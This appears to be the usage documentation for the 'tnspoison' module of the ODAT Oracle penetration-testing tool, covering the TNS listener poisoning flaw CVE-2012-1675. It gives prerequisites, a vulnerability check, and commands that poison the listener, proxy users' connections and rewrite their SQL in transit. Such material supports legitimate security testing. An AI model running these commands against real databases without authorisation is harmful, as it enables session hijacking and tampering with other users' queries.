# Exploit the TNS poison attack (CVE-2012-1675)

Credit goes to [Joxean Koret](http://seclists.org/fulldisclosure/2012/Apr/204) & [donctl](https://github.com/donctl). Thanks to them.

This module (_tnspoison_) exploits the TNS listener poisoning attack [CVE-2012-1675](http://seclists.org/fulldisclosure/2012/Apr/204). This module can be used to __exploit the vulnerability__ or __check if the target is vulnerable__.

This module has been tested on the **11.1.0.7** version on **all SID lengths**. This module should run on all 10g and 11g versions.

Prerequisites for exploitation:
* the database should be vulnerable (of course)
* no encrypted (and authenticated) communication to the database
* the SID length should be <= 12
* database port should be between 1000 and 9999. Otherwise TNS registration packets sent to the database will be malformed

A remote attacker, who is __not authenticated__ to the database, can conduct a Man in The Middle (MiTM) attack to hijack connections of legitimate Oracle users and execute arbitrary database commands. To exploit this vulnerability, the attacker needs to perform a remote registration of a database instance.

> Notice that __all 10g or 11g versions__ I have tested __are vulnerable__ to TNS poisoning attack after a default installation.  

The following command can be used to check if the target is vulnerable:
```bash
./odat.py tnspoison -s $SERVER -d $ID --test-module
```

The following command can be used to exploit the vulnerability:
```bash
./odat.py  tnspoison   -s 192.168.56.101 -d ORCL  --poison
```

To exploit the vulnerability, the module will begin by running a simple __application proxy locally__. After, the module will __send frequently TNS registration packets to the database__ for redirecting new connections from database users to the proxy. When this local proxy receives a new connection from a database user, it will forward the connection to the database. It is then possible to modify SQL requests sent to the database by legitimate users or applications.

You can define the listening port for the proxy with the *--listening-port*
```bash
./odat.py  tnspoison   -s 192.168.56.101 -d ORCL  --poison  --listening-port 9999
```

The local listening port should be **between 1000 and 9999** otherwise packets sent by the module will be malformed.

If the SID>=9, the proxy will have to fix the connection string sent by Oracle clients in order to each thick client establishes a good connection to the database. If the connection string is not fixed, Oracle users will not be able to connect to the database. I don't know why I have to do that with SID>=9 only.

You can use your connection string if you want with the following option:
```bash
./odat.py  tnspoison -s $HOST -d $SID  --poison  --cstring '(DESCRIPTION=(CONNECT_DATA=(SERVICE_NAME=ORCL)(CID=(PROGRAM=sqlplus@blabla)(HOST=pc)(USER=blabla))(SERVER=dedicated)(INSTANCE_NAME=ORCL))(ADDRESS=(PROTOCOL=TCP)(HOST=192.168.1.254)(PORT=1521)))'
```

Notice this connection string is used when the SID>=9 only.

If you want, you can replace a string (on the fly) of a packet which is transferring to the database:
```bash
./odat.py  tnspoison   -s 192.168.56.101 -d ORCL  --poison  --replace 'select * from v$version' 'select user from dual  '
```

The string which is replaced should have the same size than the new string. Otherwise, the packet sent to the database will be malformed. 

You can define the sleep time between each TNS register packet sent to the database with the *--sleep-time* option:
```bash
./odat.py  tnspoison   -s 192.168.56.101 -d ORCL  --poison  --sleep-time 5
```

